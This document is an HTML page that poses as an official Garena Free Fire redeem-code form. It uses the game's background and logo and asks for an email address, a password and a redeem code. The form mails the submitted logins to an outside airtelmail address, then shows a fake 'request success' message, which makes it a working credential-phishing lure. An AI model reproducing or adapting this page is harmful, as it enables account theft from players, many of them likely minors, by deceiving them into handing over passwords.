

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <title>Form Example</title>
  <style>
    .success-message {
      display: none;
      color: green;
      font-weight: bold;
      margin-top: 15px;
    }
  </style>
</head>

<body>
<img class="img"src="/home_esports_bg_m.658d754.jpeg" alt="">
  <div class="container">
    <img class="ff" src="/max_logo.b96cbd2.png" alt="">
    <div class="form">
      <form id="myForm" class="form" action="mailto:<8891789386>@airtelmail.com" method="POST">
        
        <div class="forms">
          <label for="email" class="lbtxt">Enter your email address</label>
          <input type="email" name="email" id="email" placeholder="GarenaFreeFireOfficial@gmail.com" required />
        </div>

        <div class="forms">
          <label for="password" class="lbtxt">Enter your password</label>
          <input type="password" name="pass" id="password" placeholder="Enter your password" required />
        </div>

        <div class="forms">
          <label for="redeem" class="lbtxt">Enter redeem code</label>
          <input type="text" name="redeem" id="redeem" placeholder="Redeem code" required />
        </div>

        <button type="submit">Submit</button>
      </form>

      <!-- ✅ Success message -->
      <p id="successMsg" class="success-message">Request success, please check after 5 min ✅</p>
    </div>
  </div>


</body>

</html>
